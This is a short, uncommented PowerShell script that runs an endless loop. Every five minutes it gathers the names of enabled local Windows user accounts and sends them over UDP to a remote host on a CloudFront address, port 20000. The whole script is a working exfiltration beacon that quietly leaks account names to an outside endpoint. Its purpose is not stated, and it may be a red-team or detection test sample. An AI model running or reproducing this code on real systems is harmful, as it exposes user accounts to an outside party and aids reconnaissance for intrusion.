[int] $Port = 20000 
$server = "d111111abcdef8.cloudfront.net" 
$ip = [System.Net.Dns]::GetHostAddresses($server)[0] 
$Address = [system.net.IPAddress]::Parse($ip) 
$End = New-Object System.Net.IPEndPoint $address, $port 
$Saddrf   = [System.Net.Sockets.AddressFamily]::InterNetwork 
$Stype    = [System.Net.Sockets.SocketType]::Dgram 
$Ptype    = [System.Net.Sockets.ProtocolType]::UDP 
$Sock     = New-Object System.Net.Sockets.Socket $saddrf, $stype, $ptype 
$Sock.TTL = 26 

while ($true) {
    $Enc     = [System.Text.Encoding]::ASCII;
    $Message = Get-LocalUser | Where-Object { $_.Enabled } | Select-Object -Property Name;

    foreach ($m in $Message) {
        $Buffer  = $Enc.GetBytes([string]$m);
        $Sock.SendTo($Buffer, $End) 
    }
    Start-Sleep 300
}